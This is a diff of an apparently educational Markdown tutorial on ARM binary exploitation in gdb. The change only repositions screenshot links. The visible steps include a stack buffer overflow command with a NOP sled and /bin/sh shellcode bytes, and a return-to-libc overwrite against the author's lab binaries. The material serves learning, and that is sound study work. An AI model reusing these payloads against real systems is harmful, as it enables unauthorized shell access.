@@ -77,22 +77,22 @@ pi@korkeep:~/BOF $ gdb -q BOF
 (gdb) start
 ```
 - **Step 4**: Disassemble main  
+![image](https://user-images.githubusercontent.com/20378368/107657827-e1a6dc00-6cc8-11eb-9891-0387c6b8c34b.png)  
 ```
 (gdb) disassemble main
 ```
 - **Step 5**: Set a breakpoint to hack  
-![image](https://user-images.githubusercontent.com/20378368/107657827-e1a6dc00-6cc8-11eb-9891-0387c6b8c34b.png)  
 ```
 // Breakpoint target:
 // 0x00010530 <+40>:    mov     r3, #0
 (gdb) b *0x00010530
 ```
 - **Step 6**: Analyze address state  
+![image](https://user-images.githubusercontent.com/20378368/107655183-a86d6c80-6cc6-11eb-9a09-7223b26fdd69.png)  
 ```
 (gdb) x/100x $sp-200
 ```
 - **Step 7**: Buffer overflow using NOP sled  
-![image](https://user-images.githubusercontent.com/20378368/107655183-a86d6c80-6cc6-11eb-9a09-7223b26fdd69.png)  
 ```
 // Target address: 0x7efff570
 (gdb) run $(python -c 'print "\x01\x10\xa0\xe1"*17+"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x03\xa0\x52\x40\xc2\x71\x05\xb4\x69\x46\x0b\x27\x01\xdf\x2d\x1c\x2f\x62\x69\x6e\x2f\x73\x68\x58"+"AAAA"+"\x70\xf5\xff\x7e"')
@@ -151,11 +151,12 @@ pi@korkeep:~/RTL $ gdb -q RTL
 (gdb) start
 ```
 - **Step 4**: Disassemble rtl()  
+![image](https://user-images.githubusercontent.com/20378368/107731737-0ab38500-6d3a-11eb-9b3e-07e1e3181b0b.png)  
 ```
 (gdb) disassemble rtl
 ```
 - **Step 5**: Find system(), /bin/sh address  
-![image](https://user-images.githubusercontent.com/20378368/107731737-0ab38500-6d3a-11eb-9b3e-07e1e3181b0b.png)
+![image](https://user-images.githubusercontent.com/20378368/107734782-8ebd3b00-6d41-11eb-83c3-b4d42e5740ae.png)  
 ```
 (gdb) x/x 0x10494
 (gdb) x/s 0x10558
@@ -166,6 +167,6 @@ pi@korkeep:~/RTL $ gdb -q RTL
 (gdb) run $(python -c 'print("A"*16+"\x88\x04\x01")')
 ```
 - **Result**  
-![image](https://user-images.githubusercontent.com/20378368/107734200-3174ba00-6d40-11eb-8306-32b063492b3f.png)
+![image](https://user-images.githubusercontent.com/20378368/107734200-3174ba00-6d40-11eb-8306-32b063492b3f.png)  
 
 ## Return-Oriented Programming 🐱‍💻
